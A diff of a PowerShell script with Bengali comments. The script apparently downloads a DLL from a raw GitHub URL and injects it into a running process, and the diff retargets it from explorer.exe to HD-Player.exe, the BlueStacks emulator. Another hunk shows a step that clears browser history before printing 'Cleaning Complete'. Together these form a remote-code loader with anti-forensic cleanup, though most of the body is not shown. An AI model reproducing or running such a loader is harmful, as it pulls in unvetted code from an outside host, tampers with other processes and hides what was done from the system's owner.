@@ -1,6 +1,6 @@
 # ================== CONFIG ===================== #
 $GitHubDLL_URL = "https://raw.githubusercontent.com/tasfik1974/textload-/main/textload.dll" # আপনার GitHub DLL Raw URL
-$processName = "explorer.exe"
+$processName = "HD-Player.exe"
 
 # Process থেকে PID পাওয়া
 $proc = Get-Process -Name ($processName -replace '\.exe$', '') -ErrorAction SilentlyContinue
@@ -129,4 +129,5 @@ try {
 } catch { Write-Host "[-] Browser history clear failed: $_" }
 
 Write-Host "✅ Cleaning Complete"
+
 
